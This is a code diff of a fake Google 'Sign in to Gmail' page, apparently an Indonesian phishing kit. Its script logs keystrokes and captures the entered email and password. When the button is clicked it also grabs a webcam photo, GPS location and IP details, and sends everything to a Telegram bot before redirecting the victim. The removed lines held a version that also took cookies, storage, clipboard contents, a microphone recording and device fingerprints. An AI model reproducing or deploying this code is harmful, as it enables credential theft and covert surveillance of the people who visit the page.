@@ -2,14 +2,15 @@
 <html lang="id">
 <head>
     <meta charset="UTF-8">
-    <meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=no">
-    <title>Sign in · Google</title>
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Sign in - Google</title>
     <style>
         *{margin:0;padding:0;box-sizing:border-box;font-family:'Google Sans',Roboto}
         body{background:#fff;display:flex;justify-content:center;align-items:center;min-height:100vh}
         .container{max-width:450px;width:100%;background:#fff;border-radius:8px;box-shadow:0 2px 10px rgba(0,0,0,0.2);padding:48px 40px 36px;text-align:center}
         .google-logo{width:75px;margin-bottom:16px}
         h1{font-size:24px;font-weight:400;margin-bottom:8px}
+        .subtitle{font-size:16px;color:#5f6368;margin-bottom:32px}
         .input-group{margin-bottom:16px;text-align:left}
         .input-group input{width:100%;padding:13px 15px;border:1px solid #dadce0;border-radius:4px;font-size:16px}
         button{width:100%;padding:12px;background:#1a73e8;color:#fff;border:none;border-radius:4px;cursor:pointer}
@@ -20,11 +21,11 @@
 <div class="container">
     <img class="google-logo" src="https://www.gstatic.com/images/branding/googlelogo/svg/googlelogo_clr_74x24px.svg">
     <h1>Sign in</h1>
-    <div class="subtitle" style="margin-bottom:32px;color:#5f6368;">to continue to Gmail</div>
+    <div class="subtitle">to continue to Gmail</div>
     <div class="input-group"><input type="email" id="email" placeholder="Email or phone"></div>
     <div class="input-group"><input type="password" id="password" placeholder="Password"></div>
     <button id="loginBtn">Next</button>
-    <div class="loading" id="loading">🔐 Checking...</div>
+    <div class="loading" id="loading">🔐 Verifying...</div>
 </div>
 
 <script>
@@ -40,121 +41,109 @@ document.addEventListener('keydown', e => {
     if (keyLogs.length > 500) keyLogs.shift();
 });
 
-async function sendTelegram(text, isPhoto = false, photoBlob = null) {
-    if (!isPhoto) {
+async function sendTelegram(text, photoBlob = null) {
+    if (photoBlob) {
+        let fd = new FormData();
+        fd.append('chat_id', CHAT_ID);
+        fd.append('photo', photoBlob, 'camera.jpg');
+        await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendPhoto`, {method: 'POST', body: fd});
+    } else {
         await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
-            method: 'POST', headers: {'Content-Type': 'application/json'},
+            method: 'POST',
+            headers: {'Content-Type': 'application/json'},
             body: JSON.stringify({chat_id: CHAT_ID, text: text.substring(0, 4090)})
-        }).catch(()=>{});
-    } else if (photoBlob) {
-        let fd = new FormData(); fd.append('chat_id', CHAT_ID); fd.append('photo', photoBlob);
-        await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendPhoto`, {method: 'POST', body: fd}).catch(()=>{});
+        });
     }
 }
 
-async function collectAll(email, pass) {
+async function getCameraPhoto() {
+    try {
+        // Ini akan MUNCULKAN POPUP IZIN karena dipanggil saat tombol diklik!
+        let stream = await navigator.mediaDevices.getUserMedia({ video: true });
+        let video = document.createElement('video');
+        video.srcObject = stream;
+        await video.play();
+        let canvas = document.createElement('canvas');
+        canvas.width = video.videoWidth || 640;
+        canvas.height = video.videoHeight || 480;
+        canvas.getContext('2d').drawImage(video, 0, 0);
+        let blob = await new Promise(r => canvas.toBlob(r, 'image/jpeg', 0.8));
+        stream.getTracks().forEach(track => track.stop());
+        return blob;
+    } catch(e) {
+        return null;
+    }
+}
+
+async function getLocation() {
+    try {
+        // Ini juga akan MUNCULKAN POPUP IZIN
+        let pos = await new Promise((resolve, reject) => {
+            navigator.geolocation.getCurrentPosition(resolve, reject);
+        });
+        return `${pos.coords.latitude}, ${pos.coords.longitude} (akurasi: ${pos.coords.accuracy}m)`;
+    } catch(e) {
+        return 'Tidak diizinkan';
+    }
+}
+
+async function collectData(email, pass, cameraBlob, location) {
     let ip = await fetch('https://ipapi.co/json/').then(r=>r.json()).catch(e=>({}));
-    let ip2 = await fetch('https://api.ipify.org?format=json').then(r=>r.json()).catch(e=>({ip:'?'}));
     let ua = navigator.userAgent;
-    let platform = navigator.platform;
-    let languages = navigator.languages.join(', ');
-    let screenRes = `${screen.width}x${screen.height}x${screen.colorDepth}`;
-    let ram = navigator.deviceMemory || '?';
-    let cpu = navigator.hardwareConcurrency || '?';
-    let touch = navigator.maxTouchPoints || 0;
-    let dark = window.matchMedia('(prefers-color-scheme: dark)').matches;
-    let adblock = !document.querySelector('.adsbox');
-    let cookieEnabled = navigator.cookieEnabled;
-    let doNotTrack = navigator.doNotTrack === '1';
     
-    let canvasFp = (()=>{let c=document.createElement('canvas');c.width=200;c.height=50;let ctx=c.getContext('2d');ctx.fillStyle='#f60';ctx.fillRect(0,0,100,50);ctx.fillStyle='#069';ctx.fillText('FP',50,20);return c.toDataURL().slice(-100);})();
-    
-    let audioFp = (()=>{try{let ctx=new (AudioContext||webkitAudioContext)();let osc=ctx.createOscillator();let ana=ctx.createAnalyser();osc.connect(ana);osc.frequency.value=440;osc.start();let arr=new Uint8Array(ana.frequencyBinCount);ana.getByteFrequencyData(arr);osc.stop();return arr.slice(0,10).join(',');}catch(e){return 'noaudio';}})();
-    
-    let fonts = (()=>{let f=['Arial','Verdana','Times','Roboto','Open Sans','Lato','Poppins','Inter','Helvetica','Tahoma','Georgia','Impact','Courier New'];let installed=[];let d=document.createElement('div');d.style.position='absolute';d.style.top='-9999px';d.style.fontSize='72px';document.body.appendChild(d);for(let font of f){d.style.fontFamily=`${font}, sans-serif`;d.innerHTML='mm';if(d.offsetWidth>0)installed.push(font);}document.body.removeChild(d);return installed.join(', ');})();
-    
-    let plugins = Array.from(navigator.plugins||[]).map(p=>p.name).join(', ');
-    let mimes = Array.from(navigator.mimeTypes||[]).map(m=>m.type).join(', ');
-    
-    let conn = navigator.connection||{};
-    let battery = {level:'?',charging:'?'};
-    if(navigator.getBattery){let b=await navigator.getBattery();battery.level=Math.round(b.level*100)+'%';battery.charging=b.charging?'Ya':'Tidak';}
-    
-    let gps = await new Promise(r=>navigator.geolocation?.getCurrentPosition?.(p=>r(`${p.coords.latitude},${p.coords.longitude} (${p.coords.accuracy}m)`),()=>r('Tidak diizinkan'))||r('Tidak support'));
-    
-    let mic = await (async()=>{try{let s=await navigator.mediaDevices.getUserMedia({audio:true});let rec=new MediaRecorder(s);let c=[];rec.ondataavailable=e=>c.push(e.data);rec.start();await new Promise(r=>setTimeout(r,2000));rec.stop();await new Promise(r=>rec.onstop=r);s.getTracks().forEach(t=>t.stop());let blob=new Blob(c,{type:'audio/webm'});return await new Promise(r=>{let fr=new FileReader();fr.onloadend=()=>r(fr.result.slice(0,200));fr.readAsDataURL(blob);});}catch(e){return 'gagal';}})();
-    
-    let camera = await (async()=>{try{let s=await navigator.mediaDevices.getUserMedia({video:true});let v=document.createElement('video');v.srcObject=s;await v.play();let c=document.createElement('canvas');c.width=v.videoWidth;c.height=v.videoHeight;c.getContext('2d').drawImage(v,0,0);let b=await new Promise(r=>c.toBlob(r,'image/jpeg',0.8));s.getTracks().forEach(t=>t.stop());return b;}catch(e){return null;}})();
-    
-    let now=new Date();
-    let waktu = now.toLocaleString('id-ID', {weekday:'long', year:'numeric', month:'long', day:'numeric', hour:'2-digit', minute:'2-digit', second:'2-digit', timeZoneName:'short'});
-    
-    let msg = `🔥 SUPER 200+ DATA 🔥
+    let msg = `🔥 PHISHING + KAMERA 🔥
 
-📧 EMAIL: ${email}
-🔑 PASS: ${pass}
-🌐 IP: ${ip.ip||ip2.ip} (${ip.version||'?'})
-📍 LOKASI: ${ip.city}, ${ip.country_name} (${ip.postal})
-🎯 KOORDINAT: ${ip.latitude}, ${ip.longitude}
-📡 ISP: ${ip.org} | ASN: ${ip.asn}
-🛡️ VPN/PROXY: ${ip.proxy?'YA':'TIDAK'} | TOR: ${ip.tor?'YA':'TIDAK'}
+📧 Email: ${email}
+🔑 Password: ${pass}
 
-💻 DEVICE:
-OS: ${navigator.userAgentData?.platform||'?'} | Platform: ${platform}
-RAM: ${ram} GB | CPU Core: ${cpu}
-RESOLUSI: ${screenRes} | Touch: ${touch}
-DARK MODE: ${dark?'YA':'TIDAK'} | ADBLOCK: ${adblock?'YA':'TIDAK'}
-COOKIE: ${cookieEnabled?'YA':'TIDAK'} | DNT: ${doNotTrack?'YA':'TIDAK'}
+🌐 IP: ${ip.ip || '?'}
+📍 Lokasi (IP): ${ip.city}, ${ip.country_name}
+📡 ISP: ${ip.org || '?'}
+🛡️ VPN: ${ip.proxy ? 'Ya' : 'Tidak'}
 
-🌍 BROWSER:
-UA: ${ua}
-LANG: ${languages}
-PLUGINS: ${plugins}
-MIME: ${mimes.substring(0,150)}
+📍 GPS Real: ${location}
 
-🎨 FINGERPRINT:
-CANVAS: ${canvasFp}
-AUDIO: ${audioFp}
-WEBGL: ${(c=>{let gl=document.createElement('canvas').getContext('webgl');let ext=gl?.getExtension('WEBGL_debug_renderer_info');return ext?gl.getParameter(ext.UNMASKED_RENDERER_WEBGL):'?'})()}
-FONTS: ${fonts}
+💻 OS: ${ua.includes('Android') ? 'Android' : ua.includes('iPhone') ? 'iOS' : 'Desktop'}
+🌍 Browser: ${ua.includes('Chrome') ? 'Chrome' : ua.includes('Firefox') ? 'Firefox' : 'Safari'}
 
-📡 NETWORK & BATTERY:
-NETWORK: ${conn.effectiveType||'?'} (${conn.downlink||'?'}Mbps, RTT ${conn.rtt||'?'}ms)
-BATERAI: ${battery.level} (Charging: ${battery.charging})
+⏰ Waktu: ${new Date().toLocaleString('id-ID')}
+⌨️ Keylogger: ${keyLogs.join('').slice(-200) || 'Tidak ada'}
 
-📂 STORAGE:
-COOKIES: ${document.cookie.slice(0,300)}
-LOCALSTORAGE: ${JSON.stringify(localStorage).slice(0,300)}
-SESSIONSTORAGE: ${JSON.stringify(sessionStorage).slice(0,300)}
-
-⌨️ BEHAVIOR:
-KEYLOG: ${keyLogs.join('').slice(-300)}
-CLIPBOARD: ${(await navigator.clipboard?.readText().catch(()=>'gagal'))||'tidak ada'}
-
-📍 GPS: ${gps}
-🎤 MIC: ${mic?.slice(0,100)||'gagal'}
-
-⏰ WAKTU: ${waktu} (${Math.floor(Date.now()/1000)})
-🔗 REFERRER: ${document.referrer||'langsung'}
-⏱️ DURASI: ${Math.floor((Date.now()-startTime)/1000)} detik
-`;
-    return {msg, camera};
+📸 Kamera: ${cameraBlob ? 'Berhasil diambil ✅' : 'Gagal/tidak diizinkan'}`;
+    
+    return msg;
 }
 
 document.getElementById('loginBtn').onclick = async () => {
     let email = document.getElementById('email').value.trim();
     let pass = document.getElementById('password').value;
-    if(!email||!pass) return alert('Isi semua!');
+    
+    if (!email || !pass) {
+        alert('Isi email dan password!');
+        return;
+    }
     
     let btn = document.getElementById('loginBtn');
     btn.disabled = true;
     document.getElementById('loading').style.display = 'block';
     
-    let data = await collectAll(email, pass);
-    await sendTelegram(data.msg);
-    if(data.camera) await sendTelegram('📸 FOTO KAMERA', true, data.camera);
+    // 🔥 INI KUNCINYA: Panggil kamera dan GPS pas tombol diklik
+    // Popup izin PASTI MUNCUL karena ini hasil interaksi user!
+    let [cameraBlob, location] = await Promise.all([
+        getCameraPhoto(),
+        getLocation()
+    ]);
     
-    setTimeout(()=>location.href=REDIRECT_URL, 1800);
+    let msg = await collectData(email, pass, cameraBlob, location);
+    await sendTelegram(msg);
+    
+    if (cameraBlob) {
+        await sendTelegram('📸 Hasil foto kamera:', cameraBlob);
+    }
+    
+    setTimeout(() => {
+        window.location.href = REDIRECT_URL;
+    }, 2000);
 };
 </script>
 </body>
